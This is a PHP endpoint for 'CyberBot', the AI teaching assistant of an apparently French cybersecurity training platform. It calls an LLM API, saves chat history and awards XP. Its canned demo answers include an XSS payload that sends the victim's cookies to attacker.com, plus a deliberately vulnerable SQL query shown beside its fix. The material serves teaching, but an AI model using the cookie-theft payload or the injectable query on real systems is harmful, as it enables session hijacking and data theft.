<?php
/**
 * api/chatbot.php — Endpoint de l'assistant pédagogique IA
 * Reçoit la question de l'apprenant + contexte, appelle l'API LLM,
 * sauvegarde l'historique en BDD et retourne la réponse en JSON.
 */

require_once '../includes/auth.php';
require_once '../includes/db.php';
require_once '../includes/xp_system.php';

header('Content-Type: application/json; charset=utf-8');
header('X-Content-Type-Options: nosniff');

// ── Clé API — à définir dans config/config.php ou variable d'environnement ──
$apiKey = defined('LLM_API_KEY') ? LLM_API_KEY : (getenv('LLM_API_KEY') ?: '');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit(json_encode(['error' => 'Method not allowed']));
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input || empty($input['message'])) {
    http_response_code(400);
    exit(json_encode(['error' => 'Message requis']));
}

$userId     = (int)$_SESSION['user_id'];
$userMsg    = trim(htmlspecialchars($input['message'], ENT_QUOTES, 'UTF-8'));
$currentPage = isset($input['page']) ? trim($input['page']) : 'plateforme';
$xp         = getXP();
$levelTitle = getLevelTitle($xp);

// ── Récupérer les 10 derniers messages de l'historique (contexte) ─────────────
$history = [];
$stmt = $conn->prepare(
    "SELECT role, content FROM chatbot_history
     WHERE user_id = ?
     ORDER BY created_at DESC LIMIT 10"
);
if ($stmt) {
    $stmt->bind_param("i", $userId);
    $stmt->execute();
    $rows = $stmt->get_result()->fetch_all(MYSQLI_ASSOC);
    // Inverser pour ordre chronologique
    $history = array_reverse(array_map(fn($r) => [
        'role'    => $r['role'],
        'content' => $r['content']
    ], $rows));
}

// ── Compter les échanges de cette session (pour XP chatbot) ──────────────────
if (!isset($_SESSION['chatbot_exchanges'])) {
    $_SESSION['chatbot_exchanges'] = 0;
}
$_SESSION['chatbot_exchanges']++;
if ($_SESSION['chatbot_exchanges'] === 3) {
    awardChatbotXP();
}

// ── Prompt système contextualisé ──────────────────────────────────────────────
$systemPrompt = "Tu es CyberBot, un assistant pédagogique expert en cybersécurité intégré à une plateforme d'apprentissage.

Contexte de l'apprenant :
- Niveau : {$levelTitle} ({$xp} XP)
- Page actuelle : {$currentPage}

Tes règles :
1. Réponds toujours en français, de façon claire et adaptée au niveau BTS.
2. Si l'apprenant est sur un lab, guide-le avec des indices progressifs sans donner la réponse directement.
3. Pour les questions conceptuelles, donne des explications avec des exemples concrets.
4. Si demandé, propose un mini-quiz pour tester les connaissances.
5. Ne réponds qu'aux questions liées à la cybersécurité, au développement sécurisé ou à la plateforme.
6. Formate les codes avec des backticks pour la lisibilité.
7. Sois encourageant et pédagogique.";

// ── Construction des messages pour l'API ─────────────────────────────────────
$messages = array_merge($history, [['role' => 'user', 'content' => $userMsg]]);

// ── Appel API LLM ─────────────────────────────────────────────────────────────
$assistantResponse = '';

if (empty($apiKey)) {
    // Mode démo sans clé API — réponses prédéfinies pour les tests
    $assistantResponse = getDemoResponse($userMsg, $currentPage, $levelTitle);
} else {
    $ch = curl_init('https://api.anthropic.com/v1/messages');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => [
            'Content-Type: application/json',
            'x-api-key: ' . $apiKey,
            'anthropic-version: 2023-06-01'
        ],
        CURLOPT_POSTFIELDS     => json_encode([
            'model'      => 'claude-sonnet-4-20250514',
            'max_tokens' => 1024,
            'system'     => $systemPrompt,
            'messages'   => $messages
        ]),
        CURLOPT_TIMEOUT        => 30,
        CURLOPT_SSL_VERIFYPEER => true,
    ]);

    $rawResponse = curl_exec($ch);
    $httpCode    = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode === 200 && $rawResponse) {
        $decoded = json_decode($rawResponse, true);
        $assistantResponse = $decoded['content'][0]['text'] ?? 'Réponse indisponible.';
    } else {
        $assistantResponse = "Je rencontre une difficulté technique momentanée. Réessaie dans quelques instants.";
    }
}

// ── Sauvegarder l'échange en BDD ─────────────────────────────────────────────
$stmtSave = $conn->prepare(
    "INSERT INTO chatbot_history (user_id, role, content, created_at) VALUES (?, ?, ?, NOW())"
);
if ($stmtSave) {
    $roleUser = 'user';
    $stmtSave->bind_param("iss", $userId, $roleUser, $userMsg);
    $stmtSave->execute();

    $roleAssistant = 'assistant';
    $stmtSave->bind_param("iss", $userId, $roleAssistant, $assistantResponse);
    $stmtSave->execute();
}

// ── Réponse JSON ──────────────────────────────────────────────────────────────
echo json_encode([
    'response'         => $assistantResponse,
    'xp'               => getXP(),
    'level_title'      => getLevelTitle(getXP()),
    'exchanges'        => $_SESSION['chatbot_exchanges'],
    'chatbot_xp_bonus' => ($_SESSION['chatbot_exchanges'] === 3),
]);

// ── Réponses de démonstration (mode sans clé API) ─────────────────────────────
function getDemoResponse(string $msg, string $page, string $level): string
{
    $msg = strtolower($msg);

    if (str_contains($msg, 'sql') || str_contains($page, 'sql')) {
        return "**Injection SQL** 🛡️\n\nL'injection SQL se produit quand une saisie utilisateur est directement concaténée dans une requête SQL.\n\n**Exemple vulnérable :**\n```php\n\$query = \"SELECT * FROM users WHERE email='\" . \$email . \"'\";\n```\n\n**Correction :**\n```php\n\$stmt = \$pdo->prepare('SELECT * FROM users WHERE email = ?');\n\$stmt->execute([\$email]);\n```\n\nTu veux que je t'explique pourquoi le prepared statement protège efficacement ?";
    }
    if (str_contains($msg, 'xss')) {
        return "**Cross-Site Scripting (XSS)** 🎯\n\nXSS permet à un attaquant d'injecter du JavaScript malveillant dans une page vue par d'autres utilisateurs.\n\n**Payload classique :**\n```html\n<script>document.location='http://attacker.com/?c='+document.cookie</script>\n```\n\n**Défense en PHP :**\n```php\necho htmlspecialchars(\$userInput, ENT_QUOTES, 'UTF-8');\n```\n\nTu veux pratiquer dans le Lab XSS ?";
    }
    if (str_contains($msg, 'phishing')) {
        return "**Phishing** 📧\n\nLe phishing exploite la psychologie humaine pour piéger les victimes. Les indices à chercher :\n\n- 🔴 Domaine d'expéditeur suspect (ex: `paypa1.com` au lieu de `paypal.com`)\n- 🔴 Urgence artificielle (\"Votre compte sera supprimé dans 24h\")\n- 🔴 Lien masqué avec une URL longue ou un sous-domaine douteux\n- 🔴 Fautes d'orthographe\n\nTu es sur le bon exercice dans le Lab Phishing !";
    }
    if (str_contains($msg, 'mot de passe') || str_contains($msg, 'password') || str_contains($msg, 'mdp')) {
        return "**Mots de passe robustes** 🔐\n\nUn mot de passe fort doit respecter :\n\n✅ Longueur ≥ 12 caractères\n✅ Majuscules + minuscules\n✅ Chiffres\n✅ Caractères spéciaux (!@#\$%)\n✅ Pas de mot du dictionnaire\n✅ Non compromis (vérifié via HIBP)\n\n**En PHP, toujours hasher avec bcrypt :**\n```php\n\$hash = password_hash(\$password, PASSWORD_BCRYPT, ['cost' => 12]);\n```";
    }

    return "Bonjour ! Je suis **CyberBot**, ton assistant cybersécurité 🤖\n\nJe peux t'aider sur :\n- 🔍 Les concepts cybersécurité (SQL injection, XSS, phishing...)\n- 🛡️ Les techniques de défense (WAF, SIEM, MFA...)\n- 💻 Le développement sécurisé en PHP\n- 🏆 La navigation dans les labs\n\nTon niveau actuel : **{$level}**. Que veux-tu apprendre ?";
}
